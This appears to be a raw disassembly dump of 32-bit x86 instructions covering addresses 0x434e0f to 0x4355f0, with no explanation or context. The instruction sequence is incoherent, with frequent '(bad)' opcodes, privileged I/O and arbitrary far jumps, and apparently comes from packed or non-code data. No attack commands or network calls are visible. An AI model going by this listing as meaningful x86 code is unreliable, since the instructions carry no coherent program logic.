  434e0f:	cmp    DWORD PTR [ecx],ebp
  434e11:	dec    ebp
  434e12:	in     al,0xd3
  434e14:	inc    eax
  434e15:	ret    0x7dd3
  434e18:	pop    ss
  434e19:	push   0xfffffffc
  434e1b:	and    bl,BYTE PTR [esi]
  434e1d:	xchg   DWORD PTR [edi-0x79],ecx
  434e20:	add    DWORD PTR [eax+0x34],ecx
  434e23:	jmp    0x434495f0
  434e28:	inc    ecx
  434e29:	nop
  434e2a:	sahf   
  434e2b:	dec    esp
  434e2c:	aaa    
  434e2d:	sahf   
  434e2e:	xchg   ebx,eax
  434e2f:	loopne 0x434e5d
  434e31:	ror    ah,1
  434e33:	adc    BYTE PTR [ebx],bl
  434e35:	std    
  434e36:	aad    0x60
  434e38:	push   cs
  434e39:	mov    WORD PTR [ebp+0x75939394],?
  434e3f:	mov    eax,ds:0x60da532d
  434e44:	xor    eax,0xe2e49eaa
  434e49:	dec    esi
  434e4a:	and    BYTE PTR [ecx+0x11],ah
  434e4d:	adc    DWORD PTR [edi+eax*2],ebp
  434e50:	fdiv   QWORD PTR [esi-0x6d]
  434e53:	stos   DWORD PTR es:[edi],eax
  434e54:	outs   dx,DWORD PTR ds:[esi]
  434e55:	(bad)  
  434e56:	cdq    
  434e57:	xchg   DWORD PTR [ebx-0xe],eax
  434e5a:	mov    al,ds:0xe740c86c
  434e5f:	xchg   edi,eax
  434e60:	mov    ebp,0x2a11269e
  434e65:	dec    ebx
  434e66:	xchg   DWORD PTR [edx-0x32d65672],eax
  434e6c:	outs   dx,BYTE PTR ds:[esi]
  434e6d:	xchg   edi,eax
  434e6e:	shl    BYTE PTR [edx],0xec
  434e71:	xchg   ebp,eax
  434e72:	sbb    ebp,DWORD PTR [eax]
  434e74:	inc    edx
  434e75:	push   ss
  434e76:	inc    ebx
  434e77:	stc    
  434e78:	dec    esi
  434e79:	cmp    ebx,ebp
  434e7b:	or     bh,ch
  434e7d:	lahf   
  434e7e:	aad    0xed
  434e80:	add    eax,0x88e2eab3
  434e85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434e86:	mov    edx,0x3ecb446
  434e8b:	jmp    0x434e1f
  434e8d:	cmp    BYTE PTR [edi-0x7d5ed83f],ah
  434e93:	xlat   BYTE PTR ds:[ebx]
  434e94:	inc    edx
  434e95:	add    DWORD PTR [esi],edi
  434e97:	jnp    0x434e8f
  434e99:	mov    edx,eax
  434e9b:	cmp    ebx,DWORD PTR [eax-0x443ac5ca]
  434ea1:	mov    eax,ds:0xb25b7cca
  434ea6:	test   al,0x52
  434ea8:	adc    eax,0x27165f1e
  434ead:	hlt    
  434eae:	jg     0x434ed5
  434eb0:	mov    eax,0xd231fb22
  434eb5:	pop    ebp
  434eb6:	sub    BYTE PTR [esi],dh
  434eb8:	mov    ds:0xd87778ef,eax
  434ebd:	or     BYTE PTR [eax+0x9],0x5c
  434ec1:	stc    
  434ec2:	into   
  434ec3:	lods   eax,DWORD PTR ds:[esi]
  434ec4:	pop    ds
  434ec5:	ss hlt 
  434ec7:	sbb    ah,BYTE PTR [esi-0x19ec0326]
  434ecd:	jge    0x434f00
  434ecf:	ins    BYTE PTR es:[edi],dx
  434ed0:	mov    al,BYTE PTR [ebp+0x6]
  434ed3:	cmp    esi,DWORD PTR [esp+ecx*2]
  434ed6:	loopne 0x434e7a
  434ed8:	icebp  
  434ed9:	jae    0x434eaf
  434edb:	ins    BYTE PTR es:[edi],dx
  434edc:	lahf   
  434edd:	sti    
  434ede:	cmp    DWORD PTR [ecx],ecx
  434ee0:	sar    DWORD PTR [esi],1
  434ee2:	and    DWORD PTR [ebp+eax*8+0x2a96a24e],esi
  434ee9:	xor    edi,DWORD PTR [ebp-0x467cf6e6]
  434eef:	fistp  WORD PTR [eax-0x19]
  434ef2:	cmp    ch,BYTE PTR [esi]
  434ef4:	fimul  DWORD PTR [esi+0x1c83d02c]
  434efa:	push   eax
  434efb:	jle    0x434e87
  434efd:	ret    0x1344
  434f00:	shl    ch,cl
  434f02:	cmp    al,0x20
  434f04:	dec    esp
  434f05:	pusha  
  434f06:	out    dx,al
  434f07:	pop    es
  434f08:	fs aas 
  434f0a:	repnz push eax
  434f0c:	retf   0x7c1a
  434f0f:	das    
  434f10:	cwde   
  434f11:	not    BYTE PTR [eax+0x51364b3e]
  434f17:	test   BYTE PTR [edx+0x5a0da15e],ah
  434f1d:	ret    0x44b7
  434f20:	ror    edi,cl
  434f22:	cmp    edx,DWORD PTR [ebp+0x31216ced]
  434f28:	(bad)  
  434f29:	push   ebx
  434f2a:	outs   dx,DWORD PTR ds:[esi]
  434f2b:	mov    dl,al
  434f2d:	xchg   edi,eax
  434f2e:	(bad)  
  434f2f:	sbb    al,dh
  434f31:	mov    ds:0x4bcfa5a6,eax
  434f36:	out    0x94,al
  434f38:	push   ecx
  434f39:	addr16 mov ds:0xb6b3,al
  434f3d:	pop    ds
  434f3e:	dec    esp
  434f3f:	in     al,0x48
  434f41:	jns    0x434f46
  434f43:	dec    edi
  434f44:	add    al,0x88
  434f46:	push   ds
  434f47:	test   DWORD PTR [edi],edx
  434f49:	loop   0x434fc8
  434f4b:	add    al,0xf4
  434f4d:	and    edi,DWORD PTR [ecx+ebp*8-0x75]
  434f51:	mov    bh,0xd2
  434f53:	inc    ebx
  434f54:	loop   0x434ef3
  434f56:	loopne 0x434f73
  434f58:	dec    edx
  434f59:	(bad)  
  434f5a:	fxch   st(5)
  434f5c:	popa   
  434f5d:	nop
  434f5e:	sar    esi,0x2a
  434f61:	sub    eax,0xb96d303
  434f66:	leave  
  434f67:	xor    BYTE PTR [edi-0x4dc78848],0x7a
  434f6e:	dec    edi
  434f6f:	and    al,0xc3
  434f71:	xor    al,0x38
  434f73:	rcr    BYTE PTR [edx-0x56f108b4],0xc6
  434f7a:	inc    esp
  434f7b:	mov    bl,0x3e
  434f7d:	call   0xdb72:0xd429bb30
  434f84:	jecxz  0x434f33
  434f86:	push   esp
  434f87:	test   ecx,ebx
  434f89:	push   esi
  434f8a:	push   cs
  434f8b:	gs cmp ebx,edi
  434f8e:	int    0x2b
  434f90:	xor    esp,DWORD PTR [ecx-0x29]
  434f93:	sbb    eax,0x51b2627a
  434f98:	pusha  
  434f99:	dec    eax
  434f9a:	arpl   WORD PTR [ebp+eax*4+0x55cc561e],bp
  434fa1:	es popf 
  434fa3:	xor    BYTE PTR [ecx],bl
  434fa5:	cwde   
  434fa6:	pop    esi
  434fa7:	dec    eax
  434fa8:	inc    ebx
  434fa9:	mov    ds:0xc81d52ed,eax
  434fae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434faf:	and    eax,0x47bbb75c
  434fb4:	push   0x87623017
  434fb9:	fadd   st(0),st
  434fbb:	sub    eax,0xd2d2507b
  434fc0:	push   ebx
  434fc1:	fidiv  DWORD PTR [eax-0x5a074586]
  434fc7:	add    eax,0x914903f4
  434fcc:	ja     0x43503c
  434fce:	sub    ecx,DWORD PTR [edx+0x162afd10]
  434fd4:	adc    DWORD PTR [ecx],esp
  434fd6:	mov    eax,0xbb566a58
  434fdb:	xchg   ecx,eax
  434fdc:	cmc    
  434fdd:	pop    ecx
  434fde:	shr    DWORD PTR [edi+0x77ef3444],cl
  434fe4:	mov    BYTE PTR [ecx+0x5b4525],dl
  434fea:	dec    eax
  434feb:	mov    ch,0xe2
  434fed:	push   cs
  434fee:	dec    esi
  434fef:	inc    ecx
  434ff0:	jg     0x434fcd
  434ff2:	sub    ebp,esi
  434ff4:	sub    al,BYTE PTR [ebx]
  434ff6:	sbb    esp,DWORD PTR [ebp+0x1e]
  434ff9:	jg     0x435038
  434ffb:	test   BYTE PTR [edx-0x35],cl
  434ffe:	sub    edi,DWORD PTR [esi+0x15]
  435001:	loopne 0x435031
  435003:	sbb    al,0xa6
  435005:	arpl   WORD PTR [ebx-0x6],di
  435008:	fst    QWORD PTR [edx]
  43500a:	push   edi
  43500b:	fmul   st,st(0)
  43500d:	leave  
  43500e:	inc    edi
  43500f:	pop    es
  435010:	js     0x434fad
  435012:	jmp    0x434fd6
  435014:	sub    al,0xd6
  435016:	pushf  
  435017:	es sbb esp,esi
  43501a:	lahf   
  43501b:	comiss xmm5,DWORD PTR [esp+edx*2]
  43501f:	sub    eax,0x1e1ff98b
  435024:	imul   edx,DWORD PTR [eax+esi*2+0x58],0xffffffd6
  435029:	xchg   ecx,eax
  43502a:	push   eax
  43502b:	dec    esp
  43502c:	popa   
  43502d:	sub    BYTE PTR [eax],0xc5
  435030:	js     0x435055
  435032:	add    al,0x34
  435034:	fisttp WORD PTR [eax+0x17]
  435037:	mov    bh,0xc4
  435039:	(bad)  
  43503a:	nop
  43503b:	xor    DWORD PTR [edx+0x225203a3],esp
  435041:	shl    DWORD PTR [esi],1
  435043:	xchg   ebp,eax
  435044:	pushf  
  435045:	bound  esi,QWORD PTR [ecx-0x26d5a78d]
  43504b:	jne    0x435030
  43504d:	adc    bh,BYTE PTR [bx+si+0x59]
  435052:	add    al,0x9f
  435054:	fdivr  DWORD PTR [esi+0x48]
  435057:	push   0xb9a85c9d
  43505c:	cld    
  43505d:	es stos BYTE PTR es:[edi],al
  43505f:	add    al,0x62
  435061:	sbb    ebx,eax
  435063:	and    BYTE PTR [esp+esi*2-0x22],dh
  435067:	(bad)  
  435068:	hlt    
  435069:	dec    ecx
  43506a:	test   eax,0xb7912729
  43506f:	bswap  esp
  435071:	fadd   QWORD PTR [edi]
  435073:	mov    ebp,0x56b3d275
  435078:	inc    eax
  435079:	jl     0x43501c
  43507b:	loope  0x435099
  43507d:	js     0x435078
  43507f:	add    DWORD PTR [ebx+0x2d],ecx
  435082:	push   es
  435083:	in     al,dx
  435084:	cdq    
  435085:	jp     0x435089
  435087:	push   ecx
  435088:	add    cl,BYTE PTR ds:0x73cb8104
  43508e:	and    bl,BYTE PTR [edi]
  435090:	rcl    BYTE PTR [edi+0x74],1
  435093:	lods   eax,DWORD PTR ds:[esi]
  435094:	js     0x4350cb
  435096:	mov    eax,ds:0x67d108c4
  43509b:	sub    ch,BYTE PTR [eax+0x782fbc09]
  4350a1:	imul   esi,DWORD PTR [ecx-0x33],0xfffffffb
  4350a5:	mov    dl,0x27
  4350a7:	lods   eax,DWORD PTR ds:[esi]
  4350a8:	xor    eax,0xe4778520
  4350ad:	scas   eax,DWORD PTR es:[edi]
  4350ae:	mov    dh,0x7c
  4350b0:	mov    esp,0xe6c29134
  4350b5:	adc    edx,DWORD PTR [edi-0x7a]
  4350b8:	popf   
  4350b9:	cmp    DWORD PTR [esi-0x6d],0xdba7c8a0
  4350c0:	out    dx,eax
  4350c1:	or     ah,0xc8
  4350c4:	stos   BYTE PTR es:[edi],al
  4350c5:	outs   dx,BYTE PTR ds:[esi]
  4350c6:	imul   ecx,esp,0x6f
  4350c9:	cmp    esp,ebx
  4350cb:	add    DWORD PTR [esp+ecx*4],0xfffffff6
  4350cf:	cmp    bl,BYTE PTR [ecx-0x77]
  4350d2:	mov    ecx,esp
  4350d4:	mov    al,0xc
  4350d6:	rcr    BYTE PTR [edi+0x4369cd1a],1
  4350dc:	daa    
  4350dd:	push   ss
  4350de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4350df:	and    BYTE PTR [eax-0x41b2ed32],dh
  4350e5:	cdq    
  4350e6:	jne    0x435140
  4350e8:	pop    ebp
  4350e9:	push   0x402ca214
  4350ee:	rcl    BYTE PTR [esi],0x1c
  4350f1:	xor    eax,0x1b5213fe
  4350f6:	sbb    eax,0xa95f9002
  4350fb:	inc    esi
  4350fc:	sub    al,0xf2
  4350fe:	mov    edx,0xe1449d5a
  435103:	ret    
  435104:	mov    bh,0x12
  435106:	pop    ecx
  435107:	pop    ss
  435108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435109:	fmul   st(1),st
  43510b:	add    al,0xf4
  43510d:	dec    eax
  43510e:	fsubr  st(7),st
  435110:	pop    eax
  435111:	fs jne 0x4350bf
  435114:	xor    ebp,DWORD PTR [edx-0x7f]
  435117:	mov    al,ds:0x82b8bdd
  43511c:	jae    0x43515e
  43511e:	icebp  
  43511f:	pop    ss
  435120:	sbb    esp,edi
  435122:	sbb    bh,al
  435124:	icebp  
  435125:	cwde   
  435126:	jl     0x4350fa
  435128:	sub    DWORD PTR [edx],ebp
  43512a:	dec    eax
  43512b:	les    edi,FWORD PTR [eax+0x3f]
  43512e:	ds std 
  435130:	out    dx,eax
  435131:	sub    edi,edi
  435133:	cmp    bh,BYTE PTR [eax+eiz*8-0x3e89c464]
  43513a:	add    DWORD PTR ds:0x1897effd,0x98163461
  435144:	pop    ebp
  435145:	call   0x27d4d4e7
  43514a:	adc    al,BYTE PTR ds:0xe96b10c7
  435150:	imul   ebx,DWORD PTR [ecx-0x6c],0x1d0d6d5e
  435157:	jge    0x435117
  435159:	push   ss
  43515a:	iret   
  43515b:	lock das 
  43515d:	inc    esp
  43515e:	stos   BYTE PTR es:[edi],al
  43515f:	and    eax,0xcfdf26ff
  435164:	sub    bh,0xb2
  435167:	daa    
  435168:	scas   al,BYTE PTR es:[edi]
  435169:	mov    cs,WORD PTR [edx+0x23]
  43516c:	daa    
  43516d:	inc    ebp
  43516e:	aaa    
  43516f:	shl    BYTE PTR [eax+ebp*1],1
  435172:	mov    ebx,0xf071f2e8
  435177:	hlt    
  435178:	bound  esp,QWORD PTR [ecx-0x5220cc8d]
  43517e:	push   ecx
  43517f:	inc    esp
  435180:	in     al,0x9e
  435182:	repz cmp BYTE PTR ds:0x887e30a7,ah
  435189:	xchg   esi,eax
  43518a:	je     0x435136
  43518c:	jmp    0x8db:0x1ba040e8
  435193:	cmc    
  435194:	push   esi
  435195:	ins    BYTE PTR es:[edi],dx
  435196:	dec    esi
  435197:	mov    edx,0x3bb8e2ec
  43519c:	mov    esi,DWORD PTR [esi-0x492a2319]
  4351a2:	xor    al,0x73
  4351a4:	push   es
  4351a5:	jae    0x43513a
  4351a7:	loop   0x435210
  4351a9:	iret   
  4351aa:	out    dx,al
  4351ab:	mov    ds:0x3569cb03,eax
  4351b0:	sbb    ah,BYTE PTR [ecx+0x7b]
  4351b3:	add    al,0x1c
  4351b5:	xchg   edi,eax
  4351b6:	pop    es
  4351b7:	xchg   DWORD PTR [eax+edi*8+0xb],ebp
  4351bb:	sti    
  4351bc:	sbb    eax,0x1fb432fe
  4351c1:	inc    eax
  4351c2:	(bad)  
  4351c3:	mov    bh,0x15
  4351c5:	push   ss
  4351c6:	out    0x22,al
  4351c8:	push   esp
  4351c9:	inc    eax
  4351ca:	fstp   QWORD PTR [ebx+ebp*8-0x5f2f44a9]
  4351d1:	in     eax,0x4d
  4351d3:	mov    ebp,0x731e48fb
  4351d8:	push   ebx
  4351d9:	pop    es
  4351da:	lds    esi,FWORD PTR [bx+di-0x5b]
  4351de:	sbb    BYTE PTR [esi],dl
  4351e0:	jb     0x4351f3
  4351e2:	add    BYTE PTR [edi],al
  4351e4:	loopne 0x43517f
  4351e6:	clc    
  4351e7:	pop    esi
  4351e8:	xchg   esp,eax
  4351e9:	clc    
  4351ea:	(bad)  
  4351eb:	cmp    eax,0xa1a657e
  4351f0:	ficomp DWORD PTR [edi+0x4bb059c7]
  4351f6:	inc    edi
  4351f7:	mov    ss,WORD PTR [edi-0x1b1b4f88]
  4351fd:	(bad)  
  4351fe:	mov    ch,0xee
  435200:	loopne 0x435208
  435202:	cmp    BYTE PTR [esi-0x3f],0xe4
  435206:	mov    ds:0x39f6c047,eax
  43520b:	(bad)
  43520e:	addr16 mov bh,0x67
  435211:	fwait
  435212:	shr    BYTE PTR [ebx],1
  435214:	stos   DWORD PTR es:[di],eax
  435216:	xor    dh,al
  435218:	xor    ebx,DWORD PTR [esi]
  43521a:	test   eax,0x219881b2
  43521f:	mov    ch,0xb3
  435221:	jnp    0x43527f
  435223:	mov    edx,0xf49338b3
  435228:	inc    ecx
  435229:	jle    0x435261
  43522b:	es adc eax,0x920b2784
  435231:	dec    eax
  435232:	lods   al,BYTE PTR ds:[esi]
  435233:	xchg   DWORD PTR [ecx+0x6],ebp
  435236:	fs mov ah,0x61
  435239:	push   eax
  43523a:	mov    ebp,0x53770b39
  43523f:	lock or BYTE PTR [esi-0x6e],cl
  435243:	cmp    BYTE PTR [esi-0x1d],bl
  435246:	inc    ecx
  435247:	xchg   esi,eax
  435248:	dec    ecx
  435249:	pop    ebp
  43524a:	ins    DWORD PTR es:[edi],dx
  43524b:	xchg   edi,eax
  43524c:	sub    al,0xb4
  43524e:	adc    BYTE PTR ds:0xe46fc4a4,dl
  435254:	sbb    ecx,DWORD PTR [esi]
  435256:	shl    BYTE PTR [ebx+0x4],cl
  435259:	or     al,0xdf
  43525b:	push   ecx
  43525c:	or     dl,cl
  43525e:	lods   al,BYTE PTR ds:[esi]
  43525f:	xchg   DWORD PTR [edx],esi
  435261:	mov    esi,0x961cd595
  435266:	cmp    ah,BYTE PTR [edx+0x423cda2d]
  43526c:	mov    dl,0xfb
  43526e:	sbb    DWORD PTR [ebp-0x53],esi
  435271:	sbb    al,0xb1
  435273:	outs   dx,DWORD PTR ds:[esi]
  435274:	rol    DWORD PTR [edx],1
  435276:	call   0x28a8b44a
  43527b:	enter  0xfebe,0x42
  43527f:	jno    0x4352e8
  435281:	add    BYTE PTR [esi],bl
  435283:	xchg   edx,eax
  435284:	arpl   WORD PTR [edi+0x3840ec2f],bx
  43528a:	fiadd  DWORD PTR [edi+0x607ed2d2]
  435290:	jne    0x4352a7
  435292:	add    al,0x19
  435294:	stos   BYTE PTR es:[edi],al
  435295:	into   
  435296:	out    0xe8,eax
  435298:	xor    BYTE PTR [ebx+0x4f4ba07],al
  43529e:	adc    BYTE PTR [ecx-0x696f62f2],0x97
  4352a5:	dec    esp
  4352a6:	enter  0x31a4,0x86
  4352aa:	stc    
  4352ab:	pop    ds
  4352ac:	or     DWORD PTR [ecx-0x4c3c5093],edx
  4352b2:	(bad)  
  4352b4:	into   
  4352b5:	mov    esi,edi
  4352b7:	neg    BYTE PTR [esi-0x209036df]
  4352bd:	les    eax,FWORD PTR [edx*2+0x52cfe2a6]
  4352c4:	cmp    al,bh
  4352c6:	xor    BYTE PTR [esi+edi*8-0xb6ffdf3],0x23
  4352ce:	pop    esp
  4352cf:	mov    BYTE PTR [ebx+esi*8],ch
  4352d2:	mov    esp,0x70b854f4
  4352d7:	push   cs
  4352d8:	(bad)  
  4352d9:	xchg   BYTE PTR [ebp-0x326b3b1a],bl
  4352df:	or     DWORD PTR [ebx+0x55e884e9],edi
  4352e5:	icebp  
  4352e6:	xor    al,ch
  4352e8:	mov    bl,0x73
  4352ea:	jb     0x4352a9
  4352ec:	pop    eax
  4352ed:	sub    DWORD PTR ds:0xa03ac210,eax
  4352f3:	iret   
  4352f4:	fcom   DWORD PTR [edi-0x72]
  4352f7:	mov    bl,0xb8
  4352f9:	jle    0x43532c
  4352fb:	lock add cl,cl
  4352fe:	push   edx
  4352ff:	mov    ah,0xa6
  435301:	or     BYTE PTR [eax],cl
  435303:	jmp    0xc2ca1ad8
  435308:	mov    DWORD PTR [ebx-0x74938435],eax
  43530e:	call   0xee94e2a0
  435313:	mov    ebx,0xca94c62d
  435318:	pop    eax
  435319:	sub    al,0x7f
  43531b:	in     al,0xe3
  43531d:	dec    edx
  43531e:	retf   
  43531f:	je     0x4352fe
  435321:	mov    eax,0xfa660d6f
  435326:	sub    al,BYTE PTR [ebx+0x28]
  435329:	mov    bh,0x90
  43532b:	jl     0x435390
  43532d:	fisubr DWORD PTR [edx+0x66]
  435330:	push   cs
  435331:	je     0x43536a
  435333:	fisttp QWORD PTR [esi-0x3f51c9d]
  435339:	mov    ebx,0x3c4b4c6b
  43533e:	or     al,0x4b
  435340:	mov    ?,WORD PTR [ebp-0x3f88bf13]
  435346:	shr    DWORD PTR [edx+0x77],cl
  435349:	int    0x77
  43534b:	int    0x54
  43534d:	push   ss
  43534e:	lock adc ecx,DWORD PTR [edx]
  435351:	or     cl,BYTE PTR [eax-0x12]
  435354:	xor    BYTE PTR [ebx-0x42],0x40
  435358:	cdq    
  435359:	cmc    
  43535a:	sub    al,0x1b
  43535c:	inc    esi
  43535d:	fstp   QWORD PTR [edx]
  43535f:	jnp    0x4353be
  435361:	and    ch,dh
  435363:	jp     0x43537d
  435365:	and    DWORD PTR [ebx+0x14ec28b1],edx
  43536b:	inc    eax
  43536c:	inc    edi
  43536d:	ret    
  43536e:	mov    ecx,0x5a4de95b
  435373:	shr    ecx,cl
  435375:	adc    al,0xb
  435377:	dec    edx
  435378:	aaa    
  435379:	ja     0x435397
  43537b:	(bad)  
  43537c:	daa    
  43537d:	jmp    0x435391
  43537f:	mov    dl,0xb
  435381:	mov    ds:0x58949d36,eax
  435386:	dec    esi
  435387:	aad    0xa1
  435389:	mov    ebx,0xa028cd79
  43538e:	lock int3 
  435390:	push   es
  435391:	shl    cl,1
  435393:	or     ebp,edx
  435395:	lds    edi,FWORD PTR [edi]
  435397:	les    ebp,FWORD PTR [ebx+0x2fcf37de]
  43539d:	lds    edx,FWORD PTR [esi+0xa9855e]
  4353a3:	(bad)  
  4353a4:	sub    bh,dh
  4353a6:	ss push es
  4353a8:	stc    
  4353a9:	cld    
  4353aa:	sbb    al,0x7
  4353ac:	pop    ebx
  4353ad:	jecxz  0x4353a0
  4353af:	jae    0x435416
  4353b1:	inc    edx
  4353b2:	cdq    
  4353b3:	jp     0x4353cb
  4353b5:	xchg   esp,eax
  4353b6:	in     eax,0x1
  4353b8:	or     bh,BYTE PTR [ebx+0x159357f]
  4353be:	dec    edx
  4353bf:	ss in  al,dx
  4353c1:	loope  0x4353fb
  4353c3:	inc    ecx
  4353c4:	shl    bh,1
  4353c6:	les    ecx,FWORD PTR [ecx-0x39]
  4353c9:	sahf   
  4353ca:	pop    es
  4353cb:	lea    esp,[edx-0x18187579]
  4353d1:	adc    BYTE PTR [ebx],bl
  4353d3:	es jl  0x435385
  4353d6:	test   DWORD PTR [ecx-0x3b],ebx
  4353d9:	and    BYTE PTR ds:0x56d5ce85,bl
  4353df:	int    0x3
  4353e1:	loop   0x435390
  4353e3:	or     al,0x70
  4353e5:	or     bl,ch
  4353e7:	sbb    ah,BYTE PTR [ecx+esi*2]
  4353ea:	cwde   
  4353eb:	(bad)  [eax-0x35fccf35]
  4353f1:	inc    ecx
  4353f2:	sar    BYTE PTR [ebp+eax*1+0x3e],1
  4353f6:	fstp   QWORD PTR [edx]
  4353f8:	test   edi,edi
  4353fa:	sbb    bl,ah
  4353fc:	push   ss
  4353fd:	mov    eax,0xb9974dcc
  435402:	lods   al,BYTE PTR ds:[esi]
  435403:	inc    esp
  435404:	sbb    DWORD PTR [ebx-0x1bf7b75e],esi
  43540a:	dec    eax
  43540b:	(bad)  
  43540c:	pop    ss
  43540d:	fadd   QWORD PTR [ebp-0x7d]
  435410:	add    bh,BYTE PTR [eax]
  435412:	mov    edi,0xfc39ba57
  435417:	ins    BYTE PTR es:[edi],dx
  435418:	or     cl,BYTE PTR [ecx+0x684f5f37]
  43541e:	adc    ecx,0x4a37e05e
  435424:	cld    
  435425:	(bad)  
  435426:	and    al,0xaf
  435428:	out    dx,eax
  435429:	dec    esp
  43542a:	idiv   BYTE PTR [ebx-0x7c]
  43542d:	into   
  43542e:	arpl   cx,bp
  435430:	cmp    BYTE PTR [edx-0x63],bh
  435433:	or     ecx,esp
  435435:	mov    ch,0x61
  435437:	pop    edi
  435438:	jp     0x43546e
  43543a:	(bad)  
  43543b:	mov    ch,cl
  43543d:	jnp    0x435487
  43543f:	mov    DWORD PTR [edx+0x4f049013],esi
  435445:	popa   
  435446:	nop
  435447:	(bad)  
  435448:	cmc    
  435449:	out    0x5e,eax
  43544b:	jg     0x435450
  43544d:	jae    0x435456
  43544f:	shl    BYTE PTR [eax],1
  435451:	(bad)  
  435452:	ror    DWORD PTR [ebx],cl
  435454:	xchg   esp,eax
  435455:	ds sub eax,0x8aa3bdc9
  43545b:	(bad)  
  43545c:	test   BYTE PTR [edi-0x6a],0xeb
  435460:	in     eax,0x13
  435462:	les    eax,FWORD PTR [edi]
  435464:	outs   dx,DWORD PTR ds:[esi]
  435465:	mov    ch,0x85
  435467:	mov    ebx,0x974280c8
  43546c:	push   es
  43546d:	mov    edx,0x98fc9b5e
  435472:	dec    ebp
  435473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435474:	xor    dh,BYTE PTR [esi-0x69]
  435477:	pop    ds
  435478:	adc    DWORD PTR ds:0xc647afb,ebp
  43547e:	inc    eax
  43547f:	lds    edx,FWORD PTR [edx+0x2f21cd49]
  435485:	imul   ebx,DWORD PTR [eax+0x71],0x32
  435489:	popf   
  43548a:	jno    0x43541e
  43548c:	inc    esp
  43548d:	lahf   
  43548e:	rol    esi,cl
  435490:	clc    
  435491:	jnp    0x435425
  435493:	push   0xffffffbc
  435495:	add    ah,BYTE PTR [ebx+0x27]
  435498:	ja     0x43550f
  43549a:	or     BYTE PTR [ecx],bh
  43549c:	push   ss
  43549d:	xchg   ecx,eax
  43549e:	and    al,0xe5
  4354a0:	popf   
  4354a1:	xor    BYTE PTR [edx],cl
  4354a3:	or     DWORD PTR [ebx+0x29],0x118ced2e
  4354aa:	xchg   ecx,eax
  4354ab:	call   0xaaa37ea4
  4354b0:	stos   BYTE PTR es:[edi],al
  4354b1:	je     0x435460
  4354b3:	cmp    DWORD PTR [ebx+eax*4-0x6c],0xdc24b06e
  4354bb:	dec    ebp
  4354bc:	pop    ebp
  4354bd:	push   esi
  4354be:	in     al,dx
  4354bf:	fucomi st,st(1)
  4354c1:	mov    al,0x6a
  4354c3:	sahf   
  4354c4:	jo     0x435535
  4354c6:	sub    al,0x97
  4354c8:	and    al,0xdc
  4354ca:	imul   ebp,DWORD PTR [edi],0xc2f4b566
  4354d0:	leave  
  4354d1:	adc    eax,0xf174d91f
  4354d6:	push   0xffffffaf
  4354d8:	ret    
  4354d9:	and    esi,DWORD PTR [ebx]
  4354db:	cmp    bl,0xb9
  4354de:	push   ebx
  4354df:	mov    cl,0xf8
  4354e1:	and    bh,BYTE PTR [ecx-0x3f]
  4354e4:	or     ebp,DWORD PTR [edi-0x68]
  4354e7:	cmc    
  4354e8:	dec    edi
  4354e9:	cdq    
  4354ea:	clc    
  4354eb:	jbe    0x4354a6
  4354ed:	inc    ebx
  4354ee:	loop   0x435550
  4354f0:	fiadd  DWORD PTR fs:[ebp-0x63]
  4354f4:	adc    bh,ah
  4354f6:	ret    0xa0e4
  4354f9:	mov    eax,ds:0xcbbe1c1e
  4354fe:	fisub  WORD PTR [ebx-0x41]
  435501:	xchg   DWORD PTR [edx],edi
  435503:	iret   
  435504:	dec    esi
  435505:	inc    ebx
  435506:	mov    dh,BYTE PTR [eax+0x17]
  435509:	retf   0xe011
  43550c:	fld    DWORD PTR [ebp-0x528cd5b2]
  435512:	repz dec esp
  435514:	xor    BYTE PTR [edi-0x5],al
  435517:	mov    ah,0x87
  435519:	shl    BYTE PTR [ebp+0x52],0xac
  43551d:	jo     0x43553e
  43551f:	mov    ds:0x4c91bff0,al
  435524:	mov    dl,0x5c
  435526:	cs ins BYTE PTR es:[edi],dx
  435528:	xor    dh,BYTE PTR [esi-0x77]
  43552b:	into   
  43552c:	cmp    al,0xe6
  43552e:	mov    eax,0x233a3194
  435533:	lock pop edx
  435535:	sub    DWORD PTR [ecx],ecx
  435537:	stos   DWORD PTR es:[edi],eax
  435538:	xor    eax,0xbe1deff3
  43553d:	xchg   edi,eax
  43553e:	inc    esp
  43553f:	cmovno esi,DWORD PTR [ebp-0x2abd632]
  435546:	shr    DWORD PTR [edi-0x416236be],1
  43554c:	jmp    0x4354e4
  43554e:	mov    esi,0xdc20fe51
  435553:	mov    BYTE PTR [edi+0x25f6648a],bh
  435559:	dec    esi
  43555a:	in     eax,0x51
  43555c:	scas   eax,DWORD PTR es:[edi]
  43555d:	sub    DWORD PTR [edi-0x3c],0x24bfae10
  435564:	mov    eax,0xbe8da278
  435569:	loopne 0x4354f6
  43556b:	jecxz  0x4354ff
  43556d:	xor    bh,bl
  43556f:	jnp    0x435545
  435571:	imul   ebp,DWORD PTR [esi+0x68],0x8aae644e
  435578:	das    
  435579:	je     0x435594
  43557b:	into   
  43557c:	rcl    cl,cl
  43557e:	jae    0x4355b2
  435580:	jp     0x4355f3
  435582:	nop
  435583:	retf   0xa19
  435586:	sbb    BYTE PTR ss:[esi-0x29697d30],ah
  43558d:	fsubr  st,st(1)
  43558f:	shl    DWORD PTR [esi-0x27],1
  435592:	xchg   DWORD PTR [eax-0x62bc8d2a],ebx
  435598:	les    eax,FWORD PTR [eax+eax*1-0x28b63b71]
  43559f:	out    0x87,al
  4355a1:	mov    eax,ds:0xc0022d15
  4355a6:	mov    eax,ds:0x7313c7cf
  4355ab:	add    al,0x78
  4355ad:	xchg   DWORD PTR ds:0x77226b8a,eax
  4355b3:	cmp    DWORD PTR [eax+0x7ecb3b3b],edx
  4355b9:	mov    ebp,0x3a5b951d
  4355be:	sbb    al,0x3a
  4355c0:	cmc    
  4355c1:	retf   0xb079
  4355c4:	popa   
  4355c5:	sbb    DWORD PTR [edi],ebp
  4355c7:	in     al,0x8f
  4355c9:	xor    DWORD PTR ds:0xe9761c84,eax
  4355cf:	or     DWORD PTR [ebx-0x79e4d112],edi
  4355d5:	jo     0x4355e4
  4355d7:	je     0x4355a8
  4355d9:	daa    
  4355da:	mov    ecx,0xefc17a56
  4355df:	cmp    BYTE PTR [edi+eiz*4-0x58],dh
  4355e3:	dec    eax
  4355e4:	cs aad 0x41
  4355e7:	mov    esp,DWORD PTR [edx]
  4355e9:	and    bh,BYTE PTR [edi+ebx*4+0x18eb0998]
  4355f0:	je     0x435643
